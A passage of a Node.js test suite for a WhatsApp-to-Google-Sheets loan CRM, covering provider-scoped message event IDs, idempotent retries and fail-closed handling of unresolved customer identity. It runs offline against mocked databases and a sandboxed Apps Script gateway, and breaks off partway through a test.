/**
 * TASK 5H.31 — F-02 CRITICAL GAP CLOSURE, EVENT IDENTITY HARDENING & BEHAVIORAL TEST SUITE
 *
 * Exercises ACTUAL production TypeScript source files + ACTUAL src/lib/google-sheets/gateway.gs
 * in an isolated Node.js vm sandbox with poisoned MongoDB & PostgreSQL module hooks:
 *   Group 1: R-07 Provider-Scoped Message Event Identity (6 tests)
 *   Group 2: R-05 Unresolved Customer Identity & Safe Reconciliation (6 tests)
 *   Group 3: Meta Webhook Handoff via src/app/api/whatsapp-webhook/route.ts (12 tests)
 *   Group 4: Worker AI Auto-Reply & Consent/Opt-Out via whatsapp-webhook-worker/route.ts (12 tests)
 *   Group 5: APPS_SCRIPT_GATEWAY + Real gateway.gs VM Integration (10 tests)
 *
 * Execution Mode: 100% Offline, Non-Production, Zero Live Network/Sheets/Provider Calls.
 */

const { describe, it, beforeEach, afterEach } = require('node:test');
const assert = require('node:assert/strict');
const crypto = require('node:crypto');
const fs = require('node:fs');
const Module = require('node:module');
const path = require('node:path');
const ts = require('typescript');
const vm = require('node:vm');

const ROOT_DIR = path.resolve(__dirname, '..');
const SRC_DIR = path.join(ROOT_DIR, 'src');

// TypeScript path alias resolver (@/ -> src/)
const origResolveFilename = Module._resolveFilename;
Module._resolveFilename = function (request, parent, isMain, options) {
  if (request.startsWith('@/')) {
    const candidate = path.join(SRC_DIR, request.slice(2));
    for (const c of [candidate, `${candidate}.ts`, path.join(candidate, 'index.ts')]) {
      if (fs.existsSync(c) && fs.statSync(c).isFile()) return c;
    }
  }
  return origResolveFilename.call(this, request, parent, isMain, options);
};

// In-process TypeScript transpiler for executing actual production src/**/*.ts modules
require.extensions['.ts'] = function (mod, filename) {
  const source = fs.readFileSync(filename, 'utf8');
  const compiled = ts.transpileModule(source, {
    compilerOptions: {
      module: ts.ModuleKind.CommonJS,
      target: ts.ScriptTarget.ES2022,
      esModuleInterop: true
    },
    fileName: filename
  });
  mod._compile(compiled.outputText, filename);
};

// Minimal NextResponse shim + poisoned MongoDB/PostgreSQL hooks to prove ZERO DB fallback
class MockNextResponse {
  constructor(body, init = {}) {
    this._body = body;
    this.status = init.status || 200;
    this.headers = new Map(Object.entries(init.headers || {}));
  }
  async json() {
    return typeof this._body === 'string' ? JSON.parse(this._body) : this._body;
  }
  async text() {
    return typeof this._body === 'string' ? this._body : JSON.stringify(this._body);
  }
  static json(data, init = {}) {
    return new MockNextResponse(data, init);
  }
}

let mongoAttemptCount = 0;
let postgresAttemptCount = 0;
const origLoad = Module._load;
Module._load = function (request, parent, isMain) {
  if (request === 'next/server') return { NextResponse: MockNextResponse };
  if (request === '@vercel/functions') {
    return { waitUntil: (p) => Promise.resolve(p).catch(() => {}) };
  }
  if (
    request === '@/lib/db' ||
    request === './db' ||
    request === 'mongoose' ||
    request === '@/models/Message' ||
    request === '@/models/ProviderLedger'
  ) {
    mongoAttemptCount++;
    throw new Error(`Prohibited MongoDB dependency accessed: ${request}`);
  }
  if (request === './postgres' || request === '@/lib/postgres') {
    postgresAttemptCount++;
    throw new Error(`Prohibited PostgreSQL dependency accessed: ${request}`);
  }
  return origLoad.call(this, request, parent, isMain);
};

const axios = require('axios');
const sheets = require('../src/lib/google-sheets/index.ts');
const aisensy = require('../src/lib/aisensy.ts');
const aiAgentMod = require('../src/lib/ai-agent.ts');
const webhookRoute = require('../src/app/api/whatsapp-webhook/route.ts');
const workerRoute = require('../src/app/api/whatsapp-webhook-worker/route.ts');

const {
  SHEET_COLUMNS,
  SheetsCrmError,
  UNRESOLVED_CUSTOMER_PREFIX,
  buildCanonicalMessageEventId,
  buildScopedUnresolvedCustomerId,
  isUnresolvedCustomerId,
  normalizeMessageProviderKey,
  resetMockSheetsStore,
  configureMockSheetsFaults,
  resetNoncesForTesting,
  customerRepository,
  leadRepository,
  consentRepository,
  followupRepository,
  messageEventRepository,
  webhookEventRepository
} = sheets;

const GAS_CODE = fs.readFileSync(path.join(SRC_DIR, 'lib', 'google-sheets', 'gateway.gs'), 'utf8');
const TEST_GATEWAY_SECRET = 'task_5h31_vm_hmac_secret_abcdef0123456789';
const TEST_SPREADSHEET_ID = 'TASK_5H31_SYNTHETIC_SPREADSHEET_ID';
const TEST_META_APP_SECRET = 'task_5h31_meta_app_secret_9876543210';
const TEST_WORKER_SECRET = 'task_5h31_worker_secret_abcdef1234567890';
const AUTH_TEST_PHONE_E164 = '+919175635165';
const AUTH_TEST_PHONE_DIGITS = '919175635165';

function signMetaPayload(rawBody, secret = TEST_META_APP_SECRET) {
  return 'sha256=' + crypto.createHmac('sha256', secret).update(rawBody, 'utf8').digest('hex');
}

function buildMetaInboundRequest(payload, options = {}) {
  const rawBody = JSON.stringify(payload);
  const sig = options.signature !== undefined ? options.signature : signMetaPayload(rawBody);
  const headers = {
    'Content-Type': 'application/json',
    'user-agent': 'Meta-Webhooks/1.0'
  };
  if (sig) headers['x-hub-signature-256'] = sig;
  if (options.correlationId) headers['x-correlation-id'] = options.correlationId;
  return new Request('https://www.avanifinserv.com/api/whatsapp-webhook', {
    method: 'POST',
    headers,
    body: rawBody
  });
}

function buildWorkerRequest(payload, secret = TEST_WORKER_SECRET) {
  const headers = { 'Content-Type': 'application/json' };
  if (secret !== null && secret !== undefined) headers['x-worker-auth'] = secret;
  return new Request('https://www.avanifinserv.com/api/whatsapp-webhook-worker', {
    method: 'POST',
    headers,
    body: JSON.stringify(payload)
  });
}

function createGatewayVmHarness() {
  const props = new Map([
    ['GATEWAY_HMAC_SECRET', TEST_GATEWAY_SECRET],
    ['ALLOWED_SPREADSHEET_ID', TEST_SPREADSHEET_ID]
  ]);
  const cacheMap = new Map();
  const sheetsMap = new Map();
  for (const [tab, cols] of Object.entries(SHEET_COLUMNS)) {
    sheetsMap.set(tab, [[...cols]]);
  }
  const nowIso = new Date().toISOString();
  sheetsMap.get('ADVISORS').push(
    ['ADV-SACHIN-01', 'Sachin Shinde', 'ACTIVE', 'CHIEF_LOAN_ADVISOR', nowIso, nowIso]
  );
  sheetsMap.get('SYSTEM_CONFIG').push(
    ['spreadsheet_name', 'AVANI_LOAN_SERVICES_CRM_MASTER', nowIso],
    ['schema_validation_status', 'VALID', nowIso],
    ['system_health_status', 'HEALTHY', nowIso]
  );

  let hasLock = false;
  let vmCallCount = 0;

  const sandbox = {
    PropertiesService: {
      getScriptProperties: () => ({ getProperty: (k) => (props.has(k) ? props.get(k) : null) })
    },
    CacheService: {
      getScriptCache: () => ({
        get: (k) => (cacheMap.has(k) ? cacheMap.get(k) : null),
        put: (k, v) => cacheMap.set(k, v)
      })
    },
    LockService: {
      getScriptLock: () => ({
        waitLock: () => { hasLock = true; },
        hasLock: () => hasLock,
        releaseLock: () => { hasLock = false; }
      })
    },
    Utilities: {
      Charset: { UTF_8: 'utf8' },
      computeHmacSha256Signature: (data, secret) => {
        const buf = crypto.createHmac('sha256', secret).update(data, 'utf8').digest();
        return Array.from(buf, (b) => (b > 127 ? b - 256 : b));
      }
    },
    ContentService: {
      MimeType: { JSON: 'application/json' },
      createTextOutput: (txt) => ({ setMimeType: () => ({ getContent: () => txt }) })
    },
    SpreadsheetApp: {
      getActiveSpreadsheet: () => ({
        getId: () => TEST_SPREADSHEET_ID,
        getName: () => 'AVANI_LOAN_SERVICES_CRM_MASTER',
        getSheetByName: (name) => {
          if (!sheetsMap.has(name)) return null;
          return {
            getName: () => name,
            getLastRow: () => sheetsMap.get(name).length,
            getLastColumn: () => sheetsMap.get(name)[0].length,
            getRange: (r, c, nr, nc) => ({
              getValues: () => {
                const table = sheetsMap.get(name);
                const out = [];
                for (let row = r - 1; row < r - 1 + nr; row++) {
                  const line = [];
                  for (let col = c - 1; col < c - 1 + nc; col++) {
                    line.push(table[row]?.[col] ?? '');
                  }
                  out.push(line);
                }
                return out;
              },
              setValues: (vals) => {
                const table = sheetsMap.get(name);
                for (let i = 0; i < vals.length; i++) {
                  table[r - 1 + i] = [...vals[i]];
                }
              }
            }),
            appendRow: (vals) => { sheetsMap.get(name).push([...vals]); },
            deleteRow: (rowIndex1Based) => { sheetsMap.get(name).splice(rowIndex1Based - 1, 1); }
          };
        }
      })
    },
    Date,
    Math,
    JSON,
    Number,
    String,
    Array,
    Object,
    isFinite
  };

  vm.createContext(sandbox);
  vm.runInContext(GAS_CODE, sandbox);

  const gatewayFetch = async (_url, init) => {
    vmCallCount++;
    const rawResp = sandbox.doPost({ postData: { contents: init.body } }).getContent();
    return {
      ok: true,
      status: 200,
      async json() {
        return JSON.parse(rawResp);
      }
    };
  };

  return {
    gatewayFetch,
    sheetsMap,
    getVmCallCount: () => vmCallCount
  };
}

const ENV_KEYS = [
  'PROVIDER_MODE',
  'AUTHORIZED_TEST_PHONE_CANONICAL',
  'WHATSAPP_TOKEN',
  'WHATSAPP_PHONE_NUMBER_ID',
  'META_APP_SECRET',
  'INTERNAL_WORKER_SECRET',
  'GOOGLE_SHEETS_TRANSPORT_MODE',
  'GOOGLE_SHEETS_ENABLE_MOCK',
  'GOOGLE_SHEETS_GATEWAY_URL',
  'GOOGLE_SHEETS_GATEWAY_SECRET',
  'GOOGLE_SHEETS_GATEWAY_TIMEOUT_MS',
  'WHATSAPP_WORKER_HANDOFF_TIMEOUT_MS',
  'WHATSAPP_INBOUND_AI_REPLY_ENABLED',
  'AISENSY_INBOUND_WEBHOOK_ENABLED',
  'CHATMITRA_INBOUND_AUTO_REPLY_ENABLED',
  'ACTIVE_WHATSAPP_PROVIDER',
  'OMNIDIM_API_KEY',
  'AISENSY_API_KEY',
  'AISENSY_WABA_API_KEY',
  'AISENCY_WABA_API_KEY',
  'GOOGLE_GENERATIVE_AI_API_KEY',
  'GEMINI_API_KEY'
];

function snapshotEnv() {
  const snap = {};
  for (const k of ENV_KEYS) snap[k] = process.env[k];
  return snap;
}

function restoreEnv(snap) {
  for (const [k, v] of Object.entries(snap)) {
    if (v === undefined) delete process.env[k];
    else process.env[k] = v;
  }
}

function setupDefaultMockEnv() {
  mongoAttemptCount = 0;
  postgresAttemptCount = 0;
  resetMockSheetsStore();
  configureMockSheetsFaults({ forceUnavailable: false, forceQuotaExceeded: false, corruptHeaderOnTab: null });
  resetNoncesForTesting();

  process.env.GOOGLE_SHEETS_TRANSPORT_MODE = 'MOCK_IN_MEMORY';
  process.env.GOOGLE_SHEETS_ENABLE_MOCK = 'true';
  process.env.PROVIDER_MODE = 'live';
  process.env.AUTHORIZED_TEST_PHONE_CANONICAL = AUTH_TEST_PHONE_DIGITS;
  process.env.WHATSAPP_TOKEN = 'EAAG_SYNTHETIC_5H31_TOKEN_DO_NOT_USE_123456';
  process.env.WHATSAPP_PHONE_NUMBER_ID = '1147494668457940';
  process.env.META_APP_SECRET = TEST_META_APP_SECRET;
  process.env.INTERNAL_WORKER_SECRET = TEST_WORKER_SECRET;
  process.env.WHATSAPP_INBOUND_AI_REPLY_ENABLED = 'true';
  process.env.AISENSY_INBOUND_WEBHOOK_ENABLED = 'true';
  process.env.ACTIVE_WHATSAPP_PROVIDER = 'meta';
  delete process.env.OMNIDIM_API_KEY;
  delete process.env.AISENSY_API_KEY;
  delete process.env.AISENSY_WABA_API_KEY;
  delete process.env.AISENCY_WABA_API_KEY;
  delete process.env.GOOGLE_GENERATIVE_AI_API_KEY;
  delete process.env.GEMINI_API_KEY;
  delete process.env.WHATSAPP_WORKER_HANDOFF_TIMEOUT_MS;
  delete process.env.GOOGLE_SHEETS_GATEWAY_TIMEOUT_MS;
}

// ============================================================================
// GROUP 1: R-07 PROVIDER-SCOPED MESSAGE EVENT IDENTITY
// ============================================================================
describe('Group 1 — R-07 Provider-Scoped Message Event Identity', () => {
  const origAxiosPost = axios.post;
  let envSnap;

  beforeEach(() => {
    envSnap = snapshotEnv();
    setupDefaultMockEnv();
  });

  afterEach(() => {
    axios.post = origAxiosPost;
    restoreEnv(envSnap);
  });

  it('G1-01: Canonical MSG_<PROVIDER>_<ID> normalizes provider aliases, preserves raw ID, and sanitizes unsafe characters deterministically', async () => {
    assert.equal(normalizeMessageProviderKey('Meta'), 'META');
    assert.equal(normalizeMessageProviderKey('MetaCloud'), 'META');
    assert.equal(normalizeMessageProviderKey('ChatMitra'), 'CHATMITRA');
    assert.equal(normalizeMessageProviderKey('ChatMantra'), 'CHATMITRA');
    assert.equal(normalizeMessageProviderKey('AiSensy'), 'AISENSY');

    assert.equal(buildCanonicalMessageEventId('Meta', 'wamid.HBgM9175'), 'MSG_META_wamid.HBgM9175');
    assert.equal(buildCanonicalMessageEventId('ChatMitra', 'cm_99001'), 'MSG_CHATMITRA_cm_99001');

    // Unsafe characters or oversized IDs produce deterministic, formula-safe hashed keys
    const unsafeA = buildCanonicalMessageEventId('Meta', 'bad id/with spaces & chars');
    const unsafeB = buildCanonicalMessageEventId('Meta', 'bad id/with spaces & chars');
    assert.equal(unsafeA, unsafeB);
    assert.match(unsafeA, /^MSG_META_[A-Za-z0-9._:-]+_[a-f0-9]{16}$/);
    assert.equal(unsafeA.includes(' '), false);
  });

  it('G1-02: Identical raw provider_message_id across Meta and ChatMitra produces two distinct rows with zero collision', async () => {
    const sharedId = 'shared_provider_id_99001';
    await messageEventRepository.recordMessageEvent({
      customer_id: 'CUST-9175635165',
      provider: 'Meta',
      message_type: 'TEXT',
      direction: 'outbound',
      delivery_status: 'SENT',
      provider_message_id: sharedId
    });
    await messageEventRepository.recordMessageEvent({
      customer_id: 'CUST-9822011223',
      provider: 'ChatMitra',
      message_type: 'TEXT',
      direction: 'outbound',
      delivery_status: 'QUEUED',
      provider_message_id: sharedId
    });

    const all = await messageEventRepository.findAll();
    assert.equal(all.length, 2, 'Two providers sharing a raw ID MUST create two isolated rows');

    const metaRow = await messageEventRepository.findByProviderMessageId(sharedId, 'Meta');
    const cmRow = await messageEventRepository.findByProviderMessageId(sharedId, 'ChatMitra');
    assert.equal(metaRow.event_id, `MSG_META_${sharedId}`);
    assert.equal(metaRow.customer_id, 'CUST-9175635165');
    assert.equal(cmRow.event_id, `MSG_CHATMITRA_${sharedId}`);
    assert.equal(cmRow.customer_id, 'CUST-9822011223');

    // Unscoped lookup across ambiguous multi-provider ID fails closed
    await assert.rejects(
      () => messageEventRepository.findByProviderMessageId(sharedId),
      (err) => err instanceof SheetsCrmError && err.code === 'GOOGLE_SHEETS_VALIDATION_FAILED'
    );
  });

  it('G1-03: Meta STATUS_UPDATE updates ONLY Meta row and preserves ChatMitra row and monotonic transitions', async () => {
    const sharedId = 'shared_status_777';
    await messageEventRepository.recordMessageEvent({
      customer_id: 'CUST-9175635165',
      provider: 'Meta',
      message_type: 'TEXT',
      direction: 'outbound',
      delivery_status: 'SENT',
      provider_message_id: sharedId
    });
    await messageEventRepository.recordMessageEvent({
      customer_id: 'CUST-9822011223',
      provider: 'ChatMitra',
      message_type: 'TEXT',
      direction: 'outbound',
      delivery_status: 'SENT',
      provider_message_id: sharedId
    });

    const delivResp = await workerRoute.POST(
      buildWorkerRequest({
        eventId: 'META_STATUS_shared_777_DELIVERED',
        eventType: 'STATUS_UPDATE',
        provider: 'Meta',
        correlationId: 'CORR-ST-1',
        data: { msgId: sharedId, statusStr: 'delivered' }
      })
    );
    assert.equal(delivResp.status, 200);

    const outOfOrderResp = await workerRoute.POST(
      buildWorkerRequest({
        eventId: 'META_STATUS_shared_777_SENT_LATE',
        eventType: 'STATUS_UPDATE',
        provider: 'Meta',
        correlationId: 'CORR-ST-2',
        data: { msgId: sharedId, statusStr: 'sent' }
      })
    );
    assert.equal(outOfOrderResp.status, 200);

    const metaRow = await messageEventRepository.findByProviderMessageId(sharedId, 'Meta');
    const cmRow = await messageEventRepository.findByProviderMessageId(sharedId, 'ChatMitra');
    assert.equal(metaRow.delivery_status, 'DELIVERED', 'Meta row must stay DELIVERED (monotonic)');
    assert.equal(cmRow.delivery_status, 'SENT', 'ChatMitra row must remain completely untouched');
  });

  it('G1-04: Legacy un-namespaced MSG_<id> matches ONLY same provider and is never overwritten by another provider', async () => {
    const legacyId = 'legacy_555';
    // Seed a historical pre-5H.31 Meta record with legacy event_id MSG_legacy_555
    await messageEventRepository.recordMessageEvent({
      event_id: `MSG_${legacyId}`,
      customer_id: 'CUST-9175635165',
      provider: 'Meta',
      message_type: 'TEXT',
      direction: 'outbound',
      delivery_status: 'SENT',
      provider_message_id: legacyId
    });

    // ChatMitra with same raw ID must NOT match Meta's legacy record
    const cmLookup = await messageEventRepository.findByProviderMessageId(legacyId, 'ChatMitra');
    assert.equal(cmLookup, null);

    // ChatMitra writes its own namespaced row cleanly without disturbing legacy Meta row
    const cmWrite = await messageEventRepository.recordMessageEvent({
      customer_id: 'CUST-9822011223',
      provider: 'ChatMitra',
      message_type: 'TEXT',
      direction: 'outbound',
      delivery_status: 'SENT',
      provider_message_id: legacyId
    });
    assert.equal(cmWrite.record.event_id, `MSG_CHATMITRA_${legacyId}`);

    // Meta status update deterministically reconciles same-provider legacy row in-place
    const metaStatusResp = await workerRoute.POST(
      buildWorkerRequest({
        eventId: 'META_STATUS_legacy_555_READ',
        eventType: 'STATUS_UPDATE',
        provider: 'Meta',
        correlationId: 'CORR-LEG-1',
        data: { msgId: legacyId, statusStr: 'read' }
      })
    );
    assert.equal(metaStatusResp.status, 200);

    const all = await messageEventRepository.findAll();
    assert.equal(all.length, 2, 'No duplicate row created for legacy Meta record');
    const metaRow = await messageEventRepository.findByProviderMessageId(legacyId, 'Meta');
    assert.equal(metaRow.event_id, `MSG_${legacyId}`);
    assert.equal(metaRow.delivery_status, 'READ');
  });

  it('G1-05: Repository rejects literal UNKNOWN or blank customer_id fail-closed', async () => {
    await assert.rejects(
      () =>
        messageEventRepository.recordMessageEvent({
          customer_id: 'UNKNOWN',
          provider: 'Meta',
          message_type: 'TEXT',
          direction: 'outbound',
          delivery_status: 'SENT',
          provider_message_id: 'wamid.reject_unknown'
        }),
      (err) => err instanceof SheetsCrmError && err.code === 'GOOGLE_SHEETS_VALIDATION_FAILED'
    );

    await assert.rejects(
      () =>
        messageEventRepository.recordMessageEvent({
          customer_id: '',
          provider: 'Meta',
          message_type: 'TEXT',
          direction: 'outbound',
          delivery_status: 'SENT',
          provider_message_id: 'wamid.reject_empty'
        }),
      (err) => err instanceof SheetsCrmError && err.code === 'GOOGLE_SHEETS_VALIDATION_FAILED'
    );
  });

  it('G1-06: Repeated Meta send retries preserve MSG_META_<id> idempotently with zero duplicates', async () => {
    await customerRepository.upsertCustomer({
      customer_id: 'CUST-9175635165',
      customer_name: 'Sachin',
      mobile_number: AUTH_TEST_PHONE_E164,
      city: 'Latur',
      enquiry_source: 'WHATSAPP_INBOUND'
    });
    axios.post = async () => ({ data: { messages: [{ id: 'wamid.retry_idem_01' }] } });
    const first = await aisensy.sendAiSensyWhatsApp(
      { destination: AUTH_TEST_PHONE_E164, userName: 'Sachin', text: 'Hi', customerId: 'CUST-9175635165' },
      'corr_idem_1'
    );
    const second = await aisensy.sendAiSensyWhatsApp(
      { destination: AUTH_TEST_PHONE_E164, userName: 'Sachin', text: 'Hi', customerId: 'CUST-9175635165' },
      'corr_idem_2'
    );
    assert.equal(first.success, true);
    assert.equal(first.eventId, 'MSG_META_wamid.retry_idem_01');
    assert.equal(first.duplicate, false);
    assert.equal(second.success, true);
    assert.equal(second.eventId, 'MSG_META_wamid.retry_idem_01');
    assert.equal(second.duplicate, true);
    assert.equal((await messageEventRepository.findAll()).length, 1);
  });

  it('G1-07 (Task 5H.33 H-01/H-02): Empty/unknown provider fails closed and canonical row takes precedence over legacy row', async () => {
    await assert.rejects(
      () =>
        messageEventRepository.recordMessageEvent({
          customer_id: 'CUST-9175635165',
          provider: '',
          message_type: 'TEXT',
          direction: 'outbound',
          delivery_status: 'SENT',
          provider_message_id: 'wamid.empty_prov_01'
        }),
      (err) => err instanceof SheetsCrmError && err.code === 'GOOGLE_SHEETS_VALIDATION_FAILED'
    );

    await assert.rejects(
      () =>
        messageEventRepository.recordMessageEvent({
          customer_id: 'CUST-9175635165',
          provider: 'UnknownProviderXYZ',
          message_type: 'TEXT',
          direction: 'outbound',
          delivery_status: 'SENT',
          provider_message_id: 'wamid.unknown_prov_01'
        }),
      (err) => err instanceof SheetsCrmError && err.code === 'GOOGLE_SHEETS_VALIDATION_FAILED'
    );

    const dualId = 'wamid.dual_legacy_canonical_01';
    await messageEventRepository.recordMessageEvent({
      event_id: `MSG_${dualId}`,
      customer_id: 'CUST-9175635165',
      provider: 'Meta',
      message_type: 'TEXT',
      direction: 'outbound',
      delivery_status: 'SENT',
      provider_message_id: dualId
    });
    await messageEventRepository.recordMessageEvent({
      event_id: `MSG_META_${dualId}`,
      customer_id: 'CUST-9175635165',
      provider: 'Meta',
      message_type: 'TEXT',
      direction: 'outbound',
      delivery_status: 'READ',
      provider_message_id: dualId
    });

    const found = await messageEventRepository.findByProviderMessageId(dualId, 'Meta');
    assert.equal(found.event_id, `MSG_META_${dualId}`, 'Canonical provider-scoped row MUST take priority over legacy row');
  });
});

// ============================================================================
// GROUP 2: R-05 UNRESOLVED CUSTOMER IDENTITY & SAFE RECONCILIATION
// ============================================================================
describe('Group 2 — R-05 Unresolved Customer Identity & Reconciliation', () => {
  const origAxiosPost = axios.post;
  let envSnap;

  beforeEach(() => {
    envSnap = snapshotEnv();
    setupDefaultMockEnv();
  });

  afterEach(() => {
    axios.post = origAxiosPost;
    restoreEnv(envSnap);
  });

  it('G2-01 (Customer found): Resolves existing customer in CUSTOMERS tab and reports persisted=true', async () => {
    await customerRepository.upsertCustomer({
      customer_id: 'CUST-9175635165',
      customer_name: 'Registered Customer',
      mobile_number: AUTH_TEST_PHONE_E164,
      city: 'Latur',
      enquiry_source: 'WHATSAPP_INBOUND'
    });

    axios.post = async () => ({ data: { messages: [{ id: 'wamid.r05_found_01' }] } });
    const res = await aisensy.sendAiSensyWhatsApp(
      { destination: AUTH_TEST_PHONE_E164, userName: 'Registered Customer', text: 'Hello' },
      'corr_r05_1'
    );
    assert.equal(res.success, true);
    assert.equal(res.persisted, true);
    assert.equal(res.customerResolved, true);
    assert.equal(res.identityPending, false);
    assert.equal(res.customerId, 'CUST-9175635165');
    assert.equal(res.eventId, 'MSG_META_wamid.r05_found_01');
  });

  it('G2-02 (Customer not yet found): Fails closed with scoped UNRESOLVED marker, never invents CUST-* or writes UNKNOWN', async () => {
    axios.post = async () => ({ data: { messages: [{ id: 'wamid.r05_missing_01' }] } });
    const res = await aisensy.sendAiSensyWhatsApp(
      { destination: AUTH_TEST_PHONE_E164, userName: 'Unknown Caller', text: 'Hello', correlationId: 'CORR-MISSING-1' },
      'corr_r05_2'
    );

    assert.equal(res.success, false, 'Missing customer identity must NOT return false persistence success');
    assert.equal(res.persisted, false);
    assert.equal(res.persistenceFailed, true);
    assert.equal(res.identityPending, true);
    assert.equal(res.persistenceErrorCode, 'CUSTOMER_IDENTITY_UNRESOLVED');
    assert.equal(res.status, 'PENDING_CUSTOMER_IDENTITY');
    assert.equal(res.eventId, 'MSG_META_wamid.r05_missing_01');
    assert.ok(res.customerId.startsWith(UNRESOLVED_CUSTOMER_PREFIX));
    assert.notEqual(res.customerId, 'UNKNOWN');
    assert.notEqual(res.customerId, 'CUST-9175635165');

    const stored = await messageEventRepository.findByProviderMessageId('wamid.r05_missing_01', 'Meta');
    assert.ok(stored);
    assert.equal(stored.provider_message_id, 'wamid.r05_missing_01');
    assert.equal(stored.customer_id, res.customerId);
    assert.equal(isUnresolvedCustomerId(stored.customer_id), true);
  });

  it('G2-03 (Lead found but customer not found): Rejects orphaned lead customer_id and fails closed safely', async () => {
    await leadRepository.upsertLead({
      lead_id: 'AVL-20261121-900001',
      customer_id: 'CUST-ORPHAN-404',
      loan_category: 'Doctor Loan',
      requested_amount: '500000'
    });

    axios.post = async () => ({ data: { messages: [{ id: 'wamid.r05_orphan_lead_01' }] } });
    const res = await aisensy.sendAiSensyWhatsApp(
      {
        destination: AUTH_TEST_PHONE_E164,
        userName: 'Orphan Lead User',
        text: 'Check status',
        leadId: 'AVL-20261121-900001',
        correlationId: 'CORR-ORPHAN-1'
      },
      'corr_r05_3'
    );

    assert.equal(res.success, false);
    assert.equal(res.persisted, false);
    assert.equal(res.identityPending, true);
    assert.equal(res.persistenceErrorCode, 'CUSTOMER_IDENTITY_UNRESOLVED');
    assert.ok(res.error.includes('LEAD_FOUND_CUSTOMER_NOT_FOUND'));
    assert.notEqual(res.customerId, 'CUST-ORPHAN-404');
    assert.notEqual(res.customerId, 'UNKNOWN');
    assert.ok(res.customerId.startsWith('UNRESOLVED_META_'));
  });

  it('G2-04 (Customer becomes available during retry): Out-of-order STATUS_UPDATE stages pending row and reconciles in-place without duplicates', async () => {
    const msgId = 'wamid.r05_reconcile_01';

    // 1. Out-of-order STATUS_UPDATE arrives BEFORE customer or outbound message exists
    const earlyResp = await workerRoute.POST(
      buildWorkerRequest({
        eventId: 'META_STATUS_r05_reconcile_SENT',
        eventType: 'STATUS_UPDATE',
        provider: 'Meta',
        correlationId: 'CORR-REC-1',
        data: { msgId, statusStr: 'sent', fromPhone: AUTH_TEST_PHONE_E164 }
      })
    );
    assert.equal(earlyResp.status, 503, 'Unresolved status callback must fail closed 503 for safe retry');
    const earlyData = await earlyResp.json();
    assert.equal(earlyData.success, false);
    assert.equal(earlyData.persisted, false);
    assert.equal(earlyData.identityPending, true);
    assert.equal(earlyData.error, 'CUSTOMER_IDENTITY_UNRESOLVED');
    assert.ok(earlyData.customerId.startsWith('UNRESOLVED_META_'));

    const webhookRowAfterFail = await webhookEventRepository.findById('META_STATUS_r05_reconcile_SENT');
    assert.equal(webhookRowAfterFail.processing_status, 'FAILED');
    assert.equal(webhookRowAfterFail.error_code, 'CUSTOMER_IDENTITY_UNRESOLVED');

    // 2. Customer now becomes available in CUSTOMERS tab
    await customerRepository.upsertCustomer({
      customer_id: 'CUST-9175635165',
      customer_name: 'Reconciled Customer',
      mobile_number: AUTH_TEST_PHONE_E164,
      city: 'Latur',
      enquiry_source: 'WHATSAPP_INBOUND'
    });

    // 3. Retry outbound persistence (even with identical status SENT!) -> MUST reconcile in-place
    const reconciled = await aisensy.persistMessageEventToSheets({
      payload: { destination: AUTH_TEST_PHONE_E164, userName: 'Reconciled Customer', correlationId: 'CORR-REC-1' },
      formattedPhone: AUTH_TEST_PHONE_E164,
      providerMessageId: msgId,
      provider: 'Meta',
      status: 'SENT',
      direction: 'outbound'
    });

    assert.equal(reconciled.persisted, true);
    assert.equal(reconciled.customerResolved, true);
    assert.equal(reconciled.reconciled, true);
    assert.equal(reconciled.customerId, 'CUST-9175635165');
    assert.equal(reconciled.eventId, `MSG_META_${msgId}`);

    // 4. Retry the previously FAILED STATUS_UPDATE webhook -> succeeds 200 and updates monotonically
    const retryResp = await workerRoute.POST(
      buildWorkerRequest({
        eventId: 'META_STATUS_r05_reconcile_SENT',
        eventType: 'STATUS_UPDATE',
        provider: 'Meta',
        correlationId: 'CORR-REC-1',
        data: { msgId, statusStr: 'delivered', fromPhone: AUTH_TEST_PHONE_E164 }
      })
    );
    assert.equal(retryResp.status, 200);
    const retryData = await retryResp.json();
    assert.equal(retryData.success, true);
    assert.equal(retryData.persisted, true);
    assert.equal(retryData.customerId, 'CUST-9175635165');

    const allMsgs = await messageEventRepository.findAll();
    assert.equal(allMsgs.length, 1, 'Reconciliation + retry MUST NOT create duplicate MESSAGE_EVENTS rows');
    assert.equal(allMsgs[0].customer_id, 'CUST-9175635165');
    assert.equal(allMsgs[0].delivery_status, 'DELIVERED');
  });

  it('G2-05 (Repeated retry of the same message): Remains idempotent both before and after customer resolution', async () => {
    const msgId = 'wamid.r05_repeat_01';
    const r1 = await aisensy.persistMessageEventToSheets({
      payload: { destination: AUTH_TEST_PHONE_E164, userName: 'Pending', correlationId: 'CORR-REP' },
      formattedPhone: AUTH_TEST_PHONE_E164,
      providerMessageId: msgId,
      provider: 'Meta',
      status: 'SENT'
    });
    const r2 = await aisensy.persistMessageEventToSheets({
      payload: { destination: AUTH_TEST_PHONE_E164, userName: 'Pending', correlationId: 'CORR-REP' },
      formattedPhone: AUTH_TEST_PHONE_E164,
      providerMessageId: msgId,
      provider: 'Meta',
      status: 'SENT'
    });

    assert.equal(r1.persisted, false);
    assert.equal(r2.persisted, false);
    assert.equal(r2.duplicate, true);
    assert.equal(r1.customerId, r2.customerId);
    assert.equal((await messageEventRepository.findAll()).length, 1);

    await customerRepository.upsertCustomer({
      customer_id: 'CUST-9175635165',
      customer_name: 'Resolved User',
      mobile_number: AUTH_TEST_PHONE_E164,
      city: 'Latur',
      enquiry_source: 'WHATSAPP_INBOUND'
    });

    const r3 = await aisensy.persistMessageEventToSheets({
      payload: { destination: AUTH_TEST_PHONE_E164, userName: 'Resolved User', correlationId: 'CORR-REP' },
      formattedPhone: AUTH_TEST_PHONE_E164,
      providerMessageId: msgId,
      provider: 'Meta',
      status: 'SENT'
    });
    const r4 = await aisensy.persistMessageEventToSheets({
      payload: { destination: AUTH_TEST_PHONE_E164, userName: 'Resolved User', correlationId: 'CORR-REP' },
      formattedPhone: AUTH_TEST_PHONE_E164,
      providerMessageId: msgId,
      provider: 'Meta',
      status: 'SENT'
    });

    assert.equal(r3.persisted, true);
    assert.equal(r3.reconciled, true);
    assert.equal(r4.persisted, true);
    assert.equal(r4.duplicate, true);
    assert.equal(r4.reconciled, false);
    assert.equal((await messageEventRepository.findAll()).length, 1);
  });

  it('G2-06 (Two unrelated messages with unresolved customer identities): Distinct scoped placeholders, zero cross-customer contamination', async () => {
    const resA = await aisensy.persistMessageEventToSheets({
      payload: { destination: '+919800000001', userName: 'Caller A', correlationId: 'CORR-A' },
      formattedPhone: '+919800000001',
      providerMessageId: 'wamid.unres_A',
      provider: 'Meta',
      status: 'SENT'
    });
